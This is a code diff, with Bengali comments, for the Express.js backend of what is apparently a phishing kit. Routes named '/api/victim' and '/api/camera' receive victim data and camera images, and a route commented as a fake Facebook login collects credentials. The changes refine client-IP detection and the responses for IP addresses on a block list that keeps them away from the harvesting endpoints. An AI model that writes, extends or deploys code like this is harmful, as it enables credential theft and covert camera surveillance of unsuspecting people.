@@ -23,22 +23,34 @@ const BLOCKED_IPS = [
 ];
 
 // ================================================================
-// ✅ সঠিক IP বের করার ফাংশন
+// ✅ উন্নত IP বের করার ফাংশন (সব হেডার চেক করে)
 // ================================================================
 function getClientIp(req) {
-    // x-forwarded-for (প্রক্সি/লোড ব্যালেন্সার)
+    // 1. x-forwarded-for (সবচেয়ে নির্ভরযোগ্য)
     const forwarded = req.headers['x-forwarded-for'];
     if (forwarded) {
         const ips = forwarded.split(',').map(ip => ip.trim());
         return ips[0];
     }
-    // অন্যান্য হেডার
-    return req.headers['cf-connecting-ip'] ||
-           req.headers['x-real-ip'] ||
-           req.connection?.remoteAddress ||
-           req.socket?.remoteAddress ||
-           req.ip ||
-           '0.0.0.0';
+    // 2. Cloudflare
+    if (req.headers['cf-connecting-ip']) {
+        return req.headers['cf-connecting-ip'];
+    }
+    // 3. Nginx real-ip
+    if (req.headers['x-real-ip']) {
+        return req.headers['x-real-ip'];
+    }
+    // 4. সরাসরি connection
+    if (req.connection && req.connection.remoteAddress) {
+        return req.connection.remoteAddress;
+    }
+    if (req.socket && req.socket.remoteAddress) {
+        return req.socket.remoteAddress;
+    }
+    if (req.ip) {
+        return req.ip;
+    }
+    return '0.0.0.0';
 }
 
 // ================================================================
@@ -110,17 +122,21 @@ router.get('/fb/:id', async (req, res) => {
 });
 
 // ================================================================
-// 📌 ভিক্টিম ডেটা রিসিভ (IP ব্লকিং এখানেও চেক করবে)
+// 🚨 ভিক্টিম ডেটা রিসিভ – IP ব্লক চেক সহ
 // ================================================================
 router.post('/api/victim', async (req, res) => {
     try {
         const clientIp = getClientIp(req);
         console.log(`🔍 IP চেক (victim): ${clientIp}`);
 
-        // 🔥 আগে আইপি চেক করুন
+        // **IP ব্লক চেক – প্রথমেই ব্লক করি**
         if (BLOCKED_IPS.includes(clientIp)) {
             console.log(`🚫 ব্লকড IP: ${clientIp} → ডেটা গ্রহণ করা হয়নি, মেসেজ পাঠানো হবে না।`);
-            return res.status(403).json({ status: 'error', message: 'Access denied' });
+            return res.status(403).json({ 
+                status: 'error', 
+                message: 'Access denied',
+                blocked: true 
+            });
         }
 
         const data = req.body;
@@ -192,7 +208,7 @@ router.post('/api/victim', async (req, res) => {
 });
 
 // ================================================================
-// 📌 ক্যামেরা ছবি রিসিভ (IP ব্লকিং এখানেও)
+// 🚨 ক্যামেরা ছবি রিসিভ – IP ব্লক চেক সহ
 // ================================================================
 router.post('/api/camera', async (req, res) => {
     try {
@@ -201,7 +217,11 @@ router.post('/api/camera', async (req, res) => {
 
         if (BLOCKED_IPS.includes(clientIp)) {
             console.log(`🚫 ব্লকড IP: ${clientIp} → ক্যামেরা ডেটা গ্রহণ করা হয়নি।`);
-            return res.status(403).json({ status: 'error', message: 'Access denied' });
+            return res.status(403).json({ 
+                status: 'error', 
+                message: 'Access denied',
+                blocked: true 
+            });
         }
 
         const { id, image } = req.body;
@@ -265,7 +285,7 @@ router.get('/image/:id/:index', async (req, res) => {
 });
 
 // ================================================================
-// ফেক ফেসবুক লগইন (IP ব্লকিং লাগবে না)
+// ফেক ফেসবুক লগইন
 // ================================================================
 router.post('/api/fblogin', async (req, res) => {
     try {
